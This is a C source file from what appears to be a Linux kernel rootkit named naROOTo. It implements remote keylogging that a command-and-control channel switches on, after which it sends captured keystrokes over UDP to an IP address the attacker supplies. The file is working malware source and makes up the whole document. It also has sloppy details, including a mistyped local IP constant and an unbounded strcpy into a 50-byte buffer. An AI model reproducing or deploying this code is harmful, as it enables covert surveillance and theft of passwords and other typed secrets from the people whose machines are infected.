/******************************************************************************
 *
 * Name: netkeylog.c 
 * This file contains all the necessary functions for remote keylogging
 *
 *****************************************************************************/
/*
 * This file is part of naROOTo.

 * naROOTo is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * naROOTo is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
 */

#include <linux/netpoll.h>
#include <linux/inet.h>
#include <linux/sched.h>

#include "include.h"

static struct netpoll *np = NULL;
static struct netpoll np_t;

int send_flag = 0; // For network keylogging

void init_netpoll(char *);

/* 
 * Function called from CC channel
 * Set the flag to notify read and initialize netpoll struct
 */
void enable_net_keylog(char *ipv4_addr)
{
	ROOTKIT_DEBUG("Enabling Network keylogging for IP %s...\n", ipv4_addr);
	send_flag = 1; // set the flag to true
	init_netpoll(ipv4_addr);// initialize the netpoll struture
}

/* 
 * Function called from CC channel
 * Disable the flag to notify read TODO: Can put the struct to NULL? Does it matter?
 */
void disable_net_keylog(void)
{
	ROOTKIT_DEBUG("Disabling Network keylogging...\n");
	send_flag = 0;
}

/* 
 * Function to initiate the sending parameters 
 * make sure to call init_netpoll before calling sendUdp()
 */
void init_netpoll(char *input_ip)
{
	
	u8 tmp[4];
        int ret;

	//convert the ipv4 to integer
	ret = in4_pton(input_ip, -1, tmp, -1, NULL);
        __u32 ip = 0;

        /* hack to convert byte array to __u32 */
        ip |= tmp[0] & 0xFF;
        ip <<= 8;
        ip |= tmp[1] & 0xFF;
        ip <<= 8;
        ip |= tmp[2] & 0xFF;
        ip <<= 8;
        ip |= tmp[3] & 0xFF;


	np_t.name = "LRNG";
	strlcpy(np_t.dev_name, "eth0", IFNAMSIZ);
	
	np_t.local_ip.ip = htonl((unsigned long int)0xc0a83865); 
	np_t.local_ip.in.s_addr = htonl((unsigned long int)0xc0a3865); 
	
	np_t.remote_ip.ip = htonl((unsigned long int)ip); 
	np_t.remote_ip.in.s_addr = htonl((unsigned long int)ip); 
    
	np_t.ipv6 = 0;//no IPv6
	
	np_t.local_port = 6666;
	np_t.remote_port = 514;
        
	memset(np_t.remote_mac, 0xff, ETH_ALEN);
        netpoll_print_options(&np_t);
        
	netpoll_setup(&np_t);
        np = &np_t;
}

/* 
 * Function to send the UDP packet 
 * Called from the read.c
 */
void send_udp(const char* buf)
{
        struct task_struct *task = current;
        
	char send_buf[50]; //size of the send buf
	sprintf(send_buf, "%d", task->pid);
        
	int len1 = strlen(send_buf);
        sprintf(send_buf+len1," = "); //Format the output
        
	int len2 = strlen(send_buf);        
	strcpy(send_buf+len2, buf);
        
	int send_len = strlen(send_buf);
        
	netpoll_send_udp(np,send_buf,send_len);
}

